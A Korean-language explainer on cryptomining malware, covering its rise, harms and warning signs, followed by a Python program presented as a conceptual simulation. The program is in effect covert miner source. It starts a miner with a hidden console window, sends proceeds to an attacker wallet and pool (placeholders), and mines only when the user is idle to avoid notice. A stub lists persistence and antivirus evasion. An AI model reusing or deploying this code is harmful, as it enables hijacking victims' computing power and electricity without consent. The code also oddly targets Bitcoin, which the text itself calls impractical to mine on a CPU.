# **크립토마이닝 악성코드**

마이닝 악성코드는 사용자(피해자)의 컴퓨터나 모바일 기기에 몰래 설치되어, 사용자 모르게 해당 기기의 컴퓨팅 자원(주로 CPU 또는 GPU 성능)과 전기를 이용하여 공격자를 위해 암호화폐(Cryptocurrency)를 채굴(Mining)하는 악성코드입니다.

## 변화 양상
- **비교적 최근:** 암호화폐 채굴 자체가 새로운 개념은 아니지만, 이것이 악성코드의 형태로 나타나 널리 퍼지기 시작한 것은 암호화폐, 특히 모네로(Monero)와 같이 일반 CPU/GPU로도 채굴 효율이 상대적으로 높았던 암호화폐의 가치가 급등했던 **2017년~2018년경부터** 입니다. 따라서 악성코드의 긴 역사에 비추어 보면 비교적 최근에 두드러진 유형이라고 할 수 있습니다.
- **유행 변동:** 암호화폐 시장의 가치 변동에 따라 유행 정도가 달라지기도 합니다. 암호화폐 가치가 높을 때는 공격자에게 더 큰 수익을 안겨주므로 마이닝 악성코드 유포가 증가하는 경향이 있습니다.
- **진화:** 초기에는 주로 PC를 대상으로 했으나, 스마트폰, 서버, 심지어 IoT 기기까지 공격 대상이 확장되었습니다. 또한, 웹사이트에 방문하기만 해도 브라우저를 통해 사용자의 PC 자원을 이용해 채굴하는 형태(크립토재킹 스크립트)도 등장했습니다.

## **피해 종류**

다른 악성코드와 달리 직접적으로 파일을 암호화하거나 데이터를 훔치는 경우는 드물지만, 다음과 같은 피해를 줍니다.

- **시스템 성능 저하:** CPU나 GPU 자원을 과도하게 사용하여 컴퓨터나 기기가 매우 느려지고 응답하지 않는 현상이 발생합니다.
- **전력 소모 증가:** 컴퓨팅 자원을 최대한 활용하므로 전기 요금이 눈에 띄게 증가할 수 있습니다.
- **하드웨어 수명 단축:** 지속적인 과부하로 인해 CPU, GPU, 팬 등의 하드웨어 부품에 무리가 가고 수명이 단축될 수 있습니다. 심한 경우 과열로 인해 시스템이 손상될 수도 있습니다.
- **생산성 저하:** 시스템 성능 저하로 인해 정상적인 작업 수행이 어려워집니다.

마이닝 악성코드는 사용자가 감염 사실을 알아채기 어렵게 백그라운드에서 조용히 작동하는 경우가 많으며, 주로 보안이 취약한 웹사이트 방문, 불법 소프트웨어 다운로드, 이메일 첨부파일 등을 통해 유포됩니다.

따라서 컴퓨터가 이유 없이 느려지거나 팬 소음이 심해지고 발열이 증가한다면 마이닝 악성코드 감염을 의심해 볼 수 있습니다. 이 유형 역시 악성코드 연구에서 중요한 부분을 차지하고 있습니다.

**매우 중요한 기술적 참고사항:**

현실적으로 개인용 컴퓨터의 CPU나 GPU를 사용하여 **비트코인(Bitcoin)**을 직접 채굴하는 것은 **거의 불가능하며 수익성이 없습니다.** 비트코인 채굴은 현재 고도로 전문화된 ASIC이라는 특수 하드웨어가 필요하며, 경쟁이 극심하여 일반 PC 자원으로는 의미 있는 양의 비트코인을 채굴할 수 없습니다.

따라서 실제 마이닝 악성코드는 비트코인 대신 모네로(Monero)와 같이 일반 CPU/GPU로도 어느 정도 채굴이 가능했던 알트코인을 대상으로 하거나, 채굴 풀(Mining Pool)에 참여하여 작은 기여를 모으는 방식으로 작동하는 경우가 많습니다.

아래 코드는 이러한 기술적 현실을 감안하여, **비트코인 채굴 및 전송'이라는 개념적인 구조**를 보여주는 Python 예시입니다. 실제 비트코인 채굴 알고리즘이나 복잡한 네트워크 통신, 고도의 은폐 기술 등은 포함되어 있지 않으며, 기본적인 틀만 제시합니다.


```python
import time
import threading
import subprocess # 외부 채굴 프로그램 실행 (개념적)
import psutil # 시스템 자원 모니터링 (설치 필요: pip install psutil)
import random
import sys
import os

# --- 설정 ---
# !!! 공격자의 비트코인 지갑 주소 (절대 실제 주소 넣지 마세요) !!!
ATTACKER_BTC_ADDRESS = "YOUR_PLACEHOLDER_BITCOIN_ADDRESS"
# 사용할 채굴 풀 주소 (개념적)
MINING_POOL_URL = "stratum+tcp://your.pool.address:port"
# 사용할 채굴 프로그램 경로 (시스템에 설치된 채굴기 또는 번들된 채굴기 지정 - 개념적)
# 실제 악성코드는 내부에 채굴기를 포함하거나 다운로드하는 경우가 많음
MINER_EXECUTABLE_PATH = "path/to/your/miner.exe" # 예시 경로
# CPU 사용률 제한 (예: 50% 이하로 유지 시도)
CPU_USAGE_LIMIT = 50.0
# 사용자 활동 감지 시간 (초) - 이 시간 동안 사용자 입력 없으면 채굴 시작/강화
IDLE_TIME_THRESHOLD = 300 # 5분

# --- 전역 변수 ---
mining_process = None
last_user_activity_time = time.time()
is_mining_active = False

# --- 핵심 함수 ---

def check_system_idle():
    """시스템이 유휴 상태인지 확인 (개념적 구현)"""
    # 실제로는 키보드/마우스 입력 감지 등 더 정교한 방법 필요
    # 여기서는 단순히 마지막 활동 시간 기준으로 판단
    idle_duration = time.time() - last_user_activity_time
    return idle_duration >= IDLE_TIME_THRESHOLD

def get_cpu_usage():
    """현재 시스템 CPU 사용률 확인"""
    try:
        return psutil.cpu_percent(interval=1)
    except Exception as e:
        print(f"[!] CPU 사용률 확인 오류: {e}")
        return 0.0 # 오류 시 0% 반환

def start_mining_process(cpu_limit):
    """채굴 프로세스 시작 (개념적 구현)"""
    global mining_process, is_mining_active
    if not os.path.exists(MINER_EXECUTABLE_PATH):
        print(f"[!] 채굴 프로그램({MINER_EXECUTABLE_PATH})을 찾을 수 없습니다.")
        return False

    # 실제 채굴 명령어 구성 (채굴 프로그램마다 다름)
    # 예시: ./miner -o POOL_URL -u WALLET_ADDRESS.WORKER_NAME -p x --cpu-max-threads-hint=PERCENT
    command = [
        MINER_EXECUTABLE_PATH,
        "-o", MINING_POOL_URL,
        "-u", f"{ATTACKER_BTC_ADDRESS}.worker{random.randint(1, 1000)}", # 작업자 이름 랜덤 생성
        "-p", "x", # 비밀번호 (풀마다 다름)
        "--cpu-max-threads-hint", str(int(cpu_limit / 2)) # CPU 스레드 제한 예시 (조정 필요)
        # 필요한 경우 추가 옵션 (예: --background, --stealth 등)
    ]

    try:
        print(f"[*] 채굴 시작 시도 (CPU 제한: {cpu_limit}%)... 명령어: {' '.join(command)}")
        # 백그라운드에서 숨겨서 실행 시도 (subprocess 옵션 활용)
        # CREATE_NO_WINDOW 플래그는 Windows에서 콘솔 창 숨김
        creationflags = 0
        if sys.platform == "win32":
            creationflags = subprocess.CREATE_NO_WINDOW

        # Popen을 사용하여 비동기적으로 실행
        mining_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=creationflags)
        print(f"[*] 채굴 프로세스 시작됨 (PID: {mining_process.pid})")
        is_mining_active = True
        return True
    except Exception as e:
        print(f"[!] 채굴 프로세스 시작 오류: {e}")
        mining_process = None
        is_mining_active = False
        return False

def stop_mining_process():
    """채굴 프로세스 중지"""
    global mining_process, is_mining_active
    if mining_process and is_mining_active:
        try:
            print("[*] 채굴 프로세스 중지 시도...")
            mining_process.terminate() # 프로세스 종료 시도
            mining_process.wait(timeout=5) # 종료 대기 (최대 5초)
            print("[*] 채굴 프로세스 중지됨.")
        except subprocess.TimeoutExpired:
            print("[!] 채굴 프로세스 종료 시간 초과. 강제 종료 시도...")
            mining_process.kill() # 강제 종료
            print("[!] 채굴 프로세스 강제 종료됨.")
        except Exception as e:
            print(f"[!] 채굴 프로세스 중지 오류: {e}")
        finally:
            mining_process = None
            is_mining_active = False

def monitor_and_manage_mining():
    """시스템 상태 모니터링 및 채굴 관리 스레드 함수"""
    global last_user_activity_time, is_mining_active
    print("[*] 모니터링 스레드 시작됨.")

    while True:
        try:
            # --- 사용자 활동 감지 업데이트 (개념적) ---
            # 실제 구현에서는 키보드/마우스 이벤트 리스너 필요
            # 예시: 사용자가 활동하면 last_user_activity_time = time.time() 호출
            # 여기서는 단순화를 위해 이 부분을 생략하고 유휴 상태 체크만 사용

            is_idle = check_system_idle()
            current_cpu_usage = get_cpu_usage()

            print(f"[*] 시스템 상태: CPU {current_cpu_usage:.1f}%, 유휴 상태: {is_idle}, 채굴 활성: {is_mining_active}")

            if is_idle and current_cpu_usage < CPU_USAGE_LIMIT:
                if not is_mining_active:
                    # 유휴 상태이고 CPU 여유가 있으면 채굴 시작
                    print("[*] 시스템 유휴 상태 및 CPU 여유 확인. 채굴 시작 조건 충족.")
                    start_mining_process(CPU_USAGE_LIMIT)
                else:
                    # 이미 채굴 중이면 상태 유지 또는 강화 (여기선 단순 유지)
                    pass
            else:
                if is_mining_active:
                    # 사용자가 활동 중이거나 CPU 사용률이 높으면 채굴 중지/약화
                    if not is_idle:
                        print("[*] 사용자 활동 감지. 채굴 중지.")
                    elif current_cpu_usage >= CPU_USAGE_LIMIT:
                         print(f"[*] CPU 사용률({current_cpu_usage:.1f}%) 임계값 초과. 채굴 중지.")
                    stop_mining_process()

            # 일정 시간 대기 후 다시 체크
            time.sleep(60) # 60초마다 체크

        except KeyboardInterrupt:
            print("[*] 모니터링 스레드: 종료 요청 감지.")
            break
        except Exception as e:
            print(f"[!] 모니터링 스레드 오류: {e}")
            time.sleep(60) # 오류 발생 시 잠시 대기 후 계속

    # 스레드 종료 전 채굴 프로세스 정리
    if is_mining_active:
        stop_mining_process()
    print("[*] 모니터링 스레드 종료됨.")


# --- 은폐 기능 (개념적) ---
def attempt_stealth():
    """탐지를 피하기 위한 은폐 시도 (개념적)"""
    # 1. 작업 스케줄러 등록 또는 레지스트리 변경을 통한 자동 실행
    # 2. 알려진 백신 프로세스 탐지 및 회피
    # 3. 자체 파일 숨김 (예: 시스템 속성 부여)
    # 4. 네트워크 트래픽 위장
    # (구현은 매우 복잡하며 OS에 따라 다름)
    print("[*] (개념) 은폐 기능 실행 시도...")
    pass


# --- 메인 실행 로직 ---
if __name__ == "__main__":
    print("--- 마이닝 악성코드 시뮬레이션 시작 ---")
    print(f"경고: 이 코드는 시스템 자원을 사용하여 '{ATTACKER_BTC_ADDRESS}' 주소로")
    print(f"      '{MINING_POOL_URL}' 풀을 통해 암호화폐 채굴을 시도합니다.")
    print(f"      CPU 사용률은 약 {CPU_USAGE_LIMIT}% 이하로 유지하려고 시도합니다.")

    # 1. 은폐 기능 실행 시도
    attempt_stealth()

    # 2. 모니터링 및 채굴 관리 스레드 시작
    monitor_thread = threading.Thread(target=monitor_and_manage_mining, daemon=True)
    monitor_thread.start()

    # 3. 메인 스레드는 대기 (사용자 활동 감지 루프 등 추가 가능)
    try:
        while True:
            # 메인 스레드에서 다른 작업을 하거나,
            # 사용자 입력 감지 (예: 키보드/마우스 이벤트)하여
            # last_user_activity_time 업데이트 필요
            time.sleep(10)
            # 예시: 여기서 사용자 입력이 감지되었다고 가정
            # last_user_activity_time = time.time()

    except KeyboardInterrupt:
        print("\n[*] 메인 스레드: 종료 요청(Ctrl+C) 감지.")
    finally:
        print("[*] 프로그램 종료 절차 시작...")
        # 모니터링 스레드가 정상 종료되도록 잠시 대기하거나 이벤트 사용 가능
        # 여기서는 모니터링 스레드가 daemon이므로 메인 종료 시 함께 종료됨
        # 명시적으로 종료 시그널을 보내고 join 하는 것이 더 안전함
        # (구현 생략)

        # 확실하게 채굴 프로세스 종료
        if is_mining_active:
             stop_mining_process()

        print("--- 마이닝 악성코드 시뮬레이션 종료 ---")
```

**코드 설명:**

1. **설정:** 공격자의 비트코인 주소 (절대 실제 주소를 사용하지 마세요!), 채굴 풀 주소, 외부 채굴 프로그램의 경로, 목표 CPU 사용률 제한, 사용자 유휴 판단 시간 등을 설정합니다.
2. **자원 모니터링 (`psutil`):** `psutil` 라이브러리를 사용하여 현재 시스템의 CPU 사용률을 확인합니다. (`pip install psutil` 필요)
3. **채굴 프로세스 관리 (`start_mining_process`, `stop_mining_process`):**
    - 실제 채굴은 외부 채굴 프로그램(예: XMRig, cpuminer 등, 이 코드에는 포함되어 있지 않음)을 `subprocess.Popen`을 사용하여 실행하는 방식으로 구현됩니다.
    - 명령어에는 채굴 풀 주소, 공격자의 지갑 주소, CPU 사용률 제한 등의 옵션이 포함됩니다. (실제 채굴 프로그램의 옵션에 맞게 수정해야 합니다.)
    - `subprocess.CREATE_NO_WINDOW` (Windows 전용) 플래그를 사용하여 콘솔 창 없이 백그라운드에서 실행을 시도합니다.
    - `terminate()` 및 `kill()`을 사용하여 채굴 프로세스를 중지합니다.
4. **상태 모니터링 및 관리 (`monitor_and_manage_mining`):**
    - 별도의 스레드에서 주기적으로 시스템 상태(CPU 사용률, 사용자 유휴 상태)를 체크합니다.
    - `check_system_idle()`: 사용자가 일정 시간 동안 활동이 없으면 유휴 상태로 판단합니다. (이 예제에서는 단순 시간 기반이며, 실제로는 키보드/마우스 입력 감지 필요)
    - 시스템이 유휴 상태이고 CPU 사용률에 여유가 있으면 채굴 프로세스를 시작합니다 (`start_mining_process`).
    - 사용자가 활동을 시작하거나 CPU 사용률이 너무 높아지면 채굴 프로세스를 중지합니다 (`stop_mining_process`). 이는 탐지를 피하고 시스템 사용성을 유지하려는 시도입니다.
5. **은폐 기능 (`attempt_stealth`):** 실제 악성코드가 탐지를 피하기 위해 사용하는 여러 기법(자동 실행 등록, 백신 회피, 파일 숨김 등)을 개념적으로 나타내는 함수입니다. 실제 구현은 매우 복잡합니다.
6. **메인 로직:** 은폐 기능을 시도하고, 모니터링 스레드를 시작한 후 메인 스레드는 대기 상태를 유지합니다. (실제로는 메인 스레드도 다른 악성 행위를 하거나 더 정교한 로직을 수행할 수 있습니다.)
